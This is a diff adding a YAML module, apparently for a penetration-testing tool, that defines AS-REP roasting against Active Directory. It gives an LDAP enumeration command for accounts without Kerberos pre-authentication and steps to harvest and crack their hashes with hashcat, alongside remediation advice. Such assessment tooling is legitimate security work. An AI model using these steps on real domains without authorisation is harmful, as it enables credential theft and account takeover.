@@ -1,0 +1,66 @@
+# AS-REP roasting — DONT_REQ_PREAUTH user harvest
+#
+# Kerberos pre-authentication is on by default, but some
+# service-adjacent user accounts have DONT_REQ_PREAUTH set (a
+# legacy compatibility mode, often for third-party integrations).
+# For those users, ANY unauthenticated party can request an AS-REP
+# and get back the user's NTLM-hash-encrypted response — no
+# credential required to trigger the roast, only a valid username.
+#
+# Narrower than Kerberoasting (fewer accounts have the flag), so
+# ranked medium. Genuinely new coverage — surfaces the route to
+# `fieldkit roast --kind asrep` in analyze / TOP MOVES.
+technique: T1558.004
+name: AS-REP roasting — DONT_REQ_PREAUTH users → offline hash cracking
+tactic: [credential-access]
+platform: [windows]
+key: adroute:asrep-roast
+ranking:
+  exploitability: medium         # narrower target set than kerberoasting
+  safety: read-only              # AS-REQ is normal Kerberos traffic
+  detection: quiet
+detect:
+  group_member: Domain Users
+execute:
+  # Enumerate users with the DONT_REQ_PREAUTH bit (UAC 0x400000)
+  # via LDAP filter. dsquery may not be on every foothold; fall
+  # back to PowerShell's AD module or a raw ldapsearch if you have
+  # to. `2>&1` catches "no matches" cleanly.
+  command: |-
+    dsquery * -filter "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -attr samAccountName 2>&1
+verify:
+  # A non-error hit prints at least one CN=… line or a
+  # sAMAccountName value.
+  success: "="
+cleanup:
+  command: ""
+report:
+  vector_type: asrep_roast
+  evidence: "on a domain (Domain Users); DONT_REQ_PREAUTH users enumerable"
+  description: >
+    A user account with the DONT_REQ_PREAUTH bit (bit 22 of
+    userAccountControl, 0x400000) skips Kerberos pre-authentication,
+    so any unauthenticated party can send an AS-REQ and receive an
+    AS-REP whose encrypted portion is protected only by the user's
+    NTLM hash — which cracks offline. Common on legacy service
+    accounts and third-party integration users where pre-auth broke
+    compatibility.
+  remediation: >
+    Audit AD for the DONT_REQ_PREAUTH flag: `Get-ADUser -Filter
+    'DoesNotRequirePreAuth -eq $true'`. Remove the flag from every
+    account that no longer needs it (usually all of them; the
+    compatibility need is rare in 2020s AD). Rotate the password
+    on every currently-flagged account since existing AS-REP hashes
+    may already be cracked.
+  refs: [T1558.004, asrep-roasting]
+playbook:
+  summary: >
+    Domain foothold + at least one DONT_REQ_PREAUTH user →
+    prep-only roast attacker-side.
+  place: 'attacker-side (impacket)'
+  steps:
+    - "review the on-host DONT_REQ_PREAUTH enum — each returned sAMAccountName is a target"
+    - "add a DC to state + domain credential if not already"
+    - "run `fieldkit roast --kind asrep` — recovered $krb5asrep$ hashes land in loot"
+    - "crack with hashcat -m 18200 (typically slower than kerberoast); re-add cracked creds"
+  restore: ""
